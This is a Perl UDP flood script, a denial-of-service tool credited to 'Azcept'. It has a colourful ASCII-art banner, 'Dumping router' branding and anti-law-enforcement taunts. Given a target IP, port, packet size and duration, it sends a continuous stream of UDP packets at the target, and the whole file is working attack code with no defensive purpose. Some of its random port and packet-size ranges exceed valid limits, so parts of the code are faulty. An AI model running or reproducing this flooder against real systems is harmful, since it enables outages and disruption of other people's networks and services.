#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
$Term::ANSIColor::AUTORESET = 2;
print BOLD RED "IP\n";
print BOLD YELLOW "port\n";
print BOLD GREEN "packets";
print BOLD BLACK "seconds\n";

############
# grumpy<----
############

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD BLUE<<EOTEXT;
-------------------------¦¦
----_------------------_¦¦¦
---¦¦¦_---------------_¦¦¦¦¦
---¦¦¦¦¦¦------------¦¦¦¦¦¦¦
---¦¦¦¦¦¦¦----------¦¦¦¦¦¦¦
----¦¦¦¦¦¦¦_¦¦¦¦¦¦¦_¦¦¦¦¦¦¦
----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
----¦¦¦¦¦_¦¦¦¦¦¦¦¦¦¦¦¦_¦¦¦¦
----¦¦¦¦¦¦___¦¦¦¦¦¦___¦¦¦¦¦¦
----¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¯¦¦¦¦
---¦¦¦¦¦¦¯¦¦¦¯¦¦¦¦¦-¯¦¯¦¦¦¦¦
---¦¦¦¦¦¦¦¦¦¦¦¯____¯¦¦¦¦¦¦¦¦
---¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
---¦¦¦¦¦¦¦¦¦¦¦_¯¯¯¯_¦¦¦¦¦¦¦¦¦
--¦¦¦¦¦¦¦¦¦¦¦¯¦¦¦¦¦¦¯¦¦¦¦¦¦¦¦
--¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
--¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
--¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
--¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
-¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
Dumping router.
Grumpy perl script.
By: Azcept 

EOTEXT

use Term::ANSIColor qw(:constants);
$Term::ANSIColor::AUTORESET = 2;
print " Fuck The Feds $ip " . ($port ? $port : "random") . "-" .
($size ? "$size-byte" : "Get No Routed Bitch!?") . "
~ RaN. 
 #OffLine  " .
($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time; 

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1500000-64)+64) ;
$pport = $port ? $port : int(rand(1500000))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}